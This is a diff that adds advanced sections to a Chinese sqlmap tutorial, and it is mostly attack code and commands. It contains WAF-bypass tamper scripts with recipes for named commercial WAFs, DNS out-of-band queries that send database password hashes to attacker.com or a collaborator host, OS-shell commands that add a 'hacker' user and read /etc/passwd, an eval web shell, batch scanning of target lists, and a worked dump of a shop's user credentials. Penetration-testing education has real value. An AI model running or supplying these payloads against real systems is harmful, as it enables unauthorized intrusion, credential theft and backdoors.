@@ -779,3 +779,515 @@ sqlmap -u "http://target.com/page.php" \
 > ⚠️ **安全提示**：sqlmap 是强大的安全测试工具，仅可用于授权测试。未经授权使用 sqlmap 攻击他人系统属于违法行为。
 
 > **延伸学习**：sqlmap 功能非常丰富，建议结合 SQLi-Labs、DVWA 等靶场练习。掌握手工注入原理后再使用工具，才能真正理解注入的本质。
+
+---
+
+## 十三、高级 Tamper 脚本编写
+
+### 13.1 Tamper 脚本结构
+
+tamper 脚本是 Python 模块，通过修改 payload 来绕过 WAF/IPS/IDS。
+
+```python
+# tamper 脚本基本结构
+# 文件路径: sqlmap/tamper/custom_tamper.py
+
+from lib.core.enums import PRIORITY
+
+__priority__ = PRIORITY.NORMAL
+
+def dependencies():
+    """声明依赖"""
+    pass
+
+def tamper(payload, **kwargs):
+    """
+    修改 payload 绕过 WAF
+    
+    参数:
+        payload: 原始 SQL 注入 payload
+        kwargs: 额外参数（headers 等）
+    
+    返回:
+        修改后的 payload
+    """
+    retVal = payload
+    
+    if payload:
+        # 示例: 将空格替换为 /**/注释
+        retVal = retVal.replace(" ", "/**/")
+        
+        # 将 UNION 替换为 UnIoN（大小写混合）
+        retVal = retVal.replace("UNION", "UnIoN")
+        
+        # 将 SELECT 替换为 SeLeCt
+        retVal = retVal.replace("SELECT", "SeLeCt")
+        
+    return retVal
+```
+
+### 13.2 自定义 Tamper 示例
+
+```python
+# 自定义 tamper: 绕过特定 WAF
+# 文件: sqlmap/tamper/bypass_specific_waf.py
+
+from lib.core.enums import PRIORITY
+from lib.core.common import singleRandom
+
+__priority__ = PRIORITY.HIGHEST
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    """组合绕过策略"""
+    retVal = ""
+    
+    if payload:
+        # 1. 关键字拆分 + 注释插入
+        keywords = ["UNION", "SELECT", "FROM", "WHERE", 
+                     "AND", "OR", "ORDER", "BY"]
+        
+        for keyword in keywords:
+            # 在关键字中间插入注释
+            mid = len(keyword) // 2
+            replacement = keyword[:mid] + "/**/" + keyword[mid:]
+            payload = payload.replace(keyword, replacement)
+            payload = payload.replace(keyword.lower(), 
+                keyword[:mid].lower() + "/**/" + keyword[mid:].lower())
+        
+        # 2. 空格替换为多种变体
+        space_variants = ["/**/", "/**/", "%0a", "%0d", "%09", "%0c"]
+        result = []
+        parts = payload.split(" ")
+        for i, part in enumerate(parts):
+            result.append(part)
+            if i < len(parts) - 1:
+                result.append(singleRandom(space_variants))
+        retVal = "".join(result)
+        
+        # 3. 括号前加注释
+        retVal = retVal.replace("(", "/**/(")
+        
+    return retVal
+```
+
+### 13.3 Tamper 组合策略
+
+```bash
+# 针对不同 WAF 的 tamper 组合推荐
+
+# ModSecurity
+sqlmap -u "..." --tamper=space2comment,modsecurityversioned,modsecurityzeroversioned,randomcase
+
+# Cloudflare WAF
+sqlmap -u "..." --tamper=space2comment,charencode,charunicodeencode,randomcase
+
+# 阿里云 WAF
+sqlmap -u "..." --tamper=space2comment,charencode,randomcase,between,percentage
+
+# 腾讯云 WAF
+sqlmap -u "..." --tamper=space2morehash,randomcase,charencode,apostrophemask
+
+# AWS WAF
+sqlmap -u "..." --tamper=space2comment,charencode,between,xforwardedfor
+
+# 通用强组合
+sqlmap -u "..." --tamper=space2comment,randomcase,charencode,charunicodeencode,between,greatest,percentage
+```
+
+---
+
+## 十四、伪静态注入
+
+### 14.1 伪静态 URL 注入
+
+伪静态（Rewrite）URL 伪装为静态页面，但实际经过动态处理。
+
+```bash
+# 伪静态 URL 示例
+# 原始: http://example.com/article.php?id=1
+# 伪静态: http://example.com/article/1.html
+
+# sqlmap 检测伪静态注入
+# 在可能注入的参数位置加 *
+sqlmap -u "http://example.com/article/1*.html"
+
+# 带路径参数的伪静态
+sqlmap -u "http://example.com/news/1*/category/2*.html"
+
+# RESTful 风格 API 注入
+sqlmap -u "http://example.com/api/v1/users/1*"
+sqlmap -u "http://example.com/api/v1/users/1*/posts/2*"
+```
+
+### 14.2 伪静态注入技巧
+
+```bash
+# 方法1: 在 URL 路径段中标记注入点
+sqlmap -u "http://example.com/product/100*/detail"
+
+# 方法2: 使用 --data 配合自定义路径
+sqlmap -u "http://example.com/search" --data="keyword=test" --headers="X-Custom: 1*"
+
+# 方法3: 配合 Rewrite 规则测试
+# 如果目标使用 .htaccess Rewrite，需要模拟实际请求
+sqlmap -u "http://example.com/page/1*" --random-agent --level=3
+
+# 方法4: Header 中的伪静态参数
+sqlmap -u "http://example.com/" --headers="X-Forwarded-For: 1*" --level=3
+sqlmap -u "http://example.com/" --headers="Referer: http://example.com/page/1*" --level=3
+```
+
+---
+
+## 十五、DNS 带外数据提取
+
+### 15.1 DNS 带外原理
+
+当目标无法直接回显数据时，可通过 DNS 查询将数据外带。攻击者控制一个 DNS 服务器，将数据编码为子域名进行查询。
+
+```bash
+# 使用 sqlmap 的 DNS 带外功能
+# 需要: 攻击者控制的域名 + DNS 服务器
+
+# 1. 配置 DNS 带外域名
+sqlmap -u "http://example.com/page?id=1" \
+       --dns-domain="attacker.com"
+
+# 2. sqlmap 会自动将数据编码为 DNS 查询
+# 查询格式: <encoded_data>.sqlmap.attacker.com
+```
+
+### 15.2 手动 DNS 带外（MySQL）
+
+```sql
+-- MySQL DNS 带外数据提取
+-- 需要 secure_file_priv 为空且 LOAD_FILE 可用
+
+-- 1. 使用 LOAD_FILE 触发 UNC 路径（Windows）
+SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM mysql.user LIMIT 1), '.attacker.com\\share'))
+
+-- 2. 使用 DNS 查询外带数据（Linux 需插件或外部程序）
+
+-- 3. 使用 sqlmap 自动 DNS 带外
+-- sqlmap 会自动处理编码和拼接
+```
+
+### 15.3 使用 Burp Collaborator 进行 DNS 带外
+
+```bash
+# Burp Suite Collaborator 作为 DNS 服务器
+# 1. 在 Burp 中获取 Collaborator 地址
+# 2. 构造 SQL 注入 payload 触发 DNS 查询
+
+# Oracle DNS 带外
+SELECT UTL_HTTP.REQUEST('http://' || (SELECT password FROM dba_users WHERE username='SYS') || '.collaborator.example.net') FROM dual
+
+# PostgreSQL DNS 带外（需要扩展）
+SELECT * FROM dblink('host=' || (SELECT password FROM pg_shadow) || '.collaborator.example.net user=a password=b', 'SELECT 1') AS t(a int)
+```
+
+---
+
+## 十六、OS Shell 与 Web Shell
+
+### 16.1 OS Shell
+
+```bash
+# 获取 OS Shell（需要 DBA 权限和文件写入权限）
+sqlmap -u "http://example.com/page?id=1" --os-shell
+
+# OS Shell 原理:
+# 1. 尝试通过数据库执行系统命令
+#    - MySQL: INTO OUTFILE 写 Webshell + 调用执行
+#    - MSSQL: xp_cmdshell 直接执行命令
+#    - PostgreSQL: COPY TO PROGRAM 执行命令
+# 2. 提供交互式命令行
+
+# OS Shell 内置命令:
+sqlmap> ?
+sqlmap> osshell> whoami
+sqlmap> osshell> net user
+sqlmap> osshell> ipconfig
+```
+
+### 16.2 直接执行命令
+
+```bash
+# 直接执行单条命令
+sqlmap -u "..." --os-cmd="whoami"
+sqlmap -u "..." --os-cmd="net user hacker P@ss123 /add"
+sqlmap -u "..." --os-cmd="cat /etc/passwd"
+```
+
+### 16.3 写入 Web Shell
+
+```bash
+# 写入自定义 Web Shell
+sqlmap -u "http://example.com/page?id=1" \
+       --file-write="/tmp/shell.php" \
+       --file-dest="/var/www/html/uploads/shell.php"
+
+# shell.php 内容示例:
+# <?php @eval($_POST['cmd']); ?>
+
+# sqlmap 自动写入的 Web Shell 路径推测:
+# 1. 尝试常见 Web 根目录
+# 2. 通过错误信息获取路径
+# 3. 通过 @@datadir 等数据库变量推断
+```
+
+---
+
+## 十七、sqlmap API 模式
+
+### 17.1 启动 API 服务
+
+```bash
+# 启动 sqlmap RESTful API
+python sqlmapapi.py -s
+
+# 指定端口
+python sqlmapapi.py -s -p 8775
+
+# 指定监听地址
+python sqlmapapi.py -s -H 0.0.0.0 -p 8775
+```
+
+### 17.2 API 调用示例
+
+```python
+# sqlmap API 客户端示例
+import requests
+import time
+
+API_URL = "http://127.0.0.1:8775"
+
+# 1. 创建新任务
+resp = requests.post(f"{API_URL}/task/new")
+task_id = resp.json()["taskid"]
+print(f"任务ID: {task_id}")
+
+# 2. 设置扫描选项
+options = {
+    "url": "http://example.com/page?id=1",
+    "level": 3,
+    "risk": 2,
+    "dbms": "mysql",
+    "technique": "BEUSTQ",
+    "tamper": "space2comment,randomcase",
+    "randomAgent": True,
+    "threads": 5,
+}
+requests.post(f"{API_URL}/option/{task_id}/set", json=options)
+
+# 3. 启动扫描
+requests.post(f"{API_URL}/scan/{task_id}/start")
+
+# 4. 轮询扫描状态
+while True:
+    status = requests.get(f"{API_URL}/scan/{task_id}/status").json()
+    if status["status"] == "terminated":
+        print("扫描完成")
+        break
+    elif status["status"] == "running":
+        print("扫描中...")
+        time.sleep(5)
+
+# 5. 获取扫描结果
+result = requests.get(f"{API_URL}/scan/{task_id}/data").json()
+for item in result.get("data", []):
+    print(f"注入点: {item.get('url')}")
+    print(f"类型: {item.get('type')}")
+    print(f"参数: {item.get('dbms')}")
+    print()
+
+# 6. 获取扫描日志
+logs = requests.get(f"{API_URL}/scan/{task_id}/log").json()
+for log in logs.get("log", []):
+    print(f"[{log['level']}] {log['message']}")
+
+# 7. 清理任务
+requests.delete(f"{API_URL}/task/{task_id}/delete")
+```
+
+### 17.3 批量自动化扫描
+
+```python
+# 批量 URL 自动化扫描
+import requests
+import time
+from concurrent.futures import ThreadPoolExecutor
+
+API_URL = "http://127.0.0.1:8775"
+
+def scan_target(url):
+    """扫描单个目标"""
+    # 创建任务
+    task_id = requests.post(f"{API_URL}/task/new").json()["taskid"]
+    
+    # 设置选项
+    options = {
+        "url": url,
+        "level": 3,
+        "batch": True,
+        "randomAgent": True,
+    }
+    requests.post(f"{API_URL}/option/{task_id}/set", json=options)
+    
+    # 启动扫描
+    requests.post(f"{API_URL}/scan/{task_id}/start")
+    
+    # 等待完成
+    while True:
+        status = requests.get(f"{API_URL}/scan/{task_id}/status").json()
+        if status["status"] == "terminated":
+            break
+        time.sleep(3)
+    
+    # 获取结果
+    result = requests.get(f"{API_URL}/scan/{task_id}/data").json()
+    
+    # 清理
+    requests.delete(f"{API_URL}/task/{task_id}/delete")
+    
+    return {
+        "url": url,
+        "vulnerable": len(result.get("data", [])) > 0,
+        "details": result.get("data", [])
+    }
+
+# 批量扫描
+targets = [
+    "http://target1.com/page?id=1",
+    "http://target2.com/news?article_id=5",
+    "http://target3.com/product?pid=10",
+]
+
+results = []
+with ThreadPoolExecutor(max_workers=3) as executor:
+    for result in executor.map(scan_target, targets):
+        results.append(result)
+        if result["vulnerable"]:
+            print(f"[!] 发现注入: {result['url']}")
+        else:
+            print(f"[OK] 未发现注入: {result['url']}")
+```
+
+---
+
+## 十八、自定义 Payload
+
+### 18.1 使用 --prefix 和 --suffix
+
+```bash
+# 前缀和后缀控制
+# 适用于需要闭合特定语法的场景
+sqlmap -u "http://example.com/page?id=1" \
+       --prefix="')" \
+       --suffix="-- "
+
+# 生成的 payload 示例:
+# 1') UNION SELECT 1,2,3-- 
+```
+
+### 18.2 使用 --test-skip 跳过特定 payload
+
+```bash
+# 跳过某些会触发 WAF 的 payload
+sqlmap -u "..." --test-skip="BENCHMARK"
+```
+
+### 18.3 自定义注入标记
+
+```bash
+# 在请求中使用 * 标记注入点
+# GET 请求
+sqlmap -u "http://example.com/page?id=1*&cat=2"
+
+# POST 请求
+sqlmap -u "http://example.com/search" \
+       --data="q=test*&page=1" 
+
+# Cookie 中标记
+sqlmap -u "http://example.com/" \
+       --cookie="session=abc; id=1*" \
+       --level=2
+
+# Header 中标记
+sqlmap -u "http://example.com/" \
+       --headers="X-Forwarded-For: 1*\nUser-Agent: *"
+```
+
+---
+
+## 十九、真实案例
+
+### 案例1：某电商平台 SQL 注入
+
+```bash
+# 目标: 某电商平台商品搜索接口
+# 发现: 搜索参数存在时间盲注
+
+# 1. 检测注入
+sqlmap -u "https://shop.example.com/search?q=phone" \
+       --data="q=phone" \
+       --method=POST \
+       --batch --level=5 --risk=2
+
+# 2. 发现时间盲注，使用 tamper 绕过 WAF
+sqlmap -u "https://shop.example.com/search" \
+       --data="q=phone" \
+       --tamper=space2comment,randomcase,charencode \
+       --technique=T \
+       --time-sec=3 \
+       --batch
+
+# 3. 提取数据库
+sqlmap -u "https://shop.example.com/search" \
+       --data="q=phone" \
+       --tamper=space2comment,randomcase,charencode \
+       --technique=T \
+       --dbs --batch
+
+# 4. 提取用户表数据
+sqlmap -u "https://shop.example.com/search" \
+       --data="q=phone" \
+       --tamper=space2comment,randomcase,charencode \
+       --technique=T \
+       -D shop_db -T users -C username,password,email \
+       --dump --batch --threads=3
+```
+
+### 案例2：二次注入检测
+
+```bash
+# 二次注入: 数据先存入数据库，后续查询时触发注入
+
+# 1. 注册账户时用户名注入
+sqlmap -u "http://example.com/register" \
+       --data="username=test*&password=123&email=test@test.com" \
+       --second-url="http://example.com/profile" \
+       --batch --level=3
+
+# 2. sqlmap 会在注入页面注入数据，然后在 second-url 检查输出
+```
+
+### 案例3：堆叠注入利用
+
+```bash
+# MSSQL 堆叠注入
+sqlmap -u "http://example.com/page?id=1" \
+       --dbms=mssql \
+       --technique=S \
+       --batch
+
+# 利用堆叠注入执行 xp_cmdshell
+sqlmap -u "http://example.com/page?id=1" \
+       --dbms=mssql \
+       --technique=S \
+       --os-shell \
+       --batch
+```
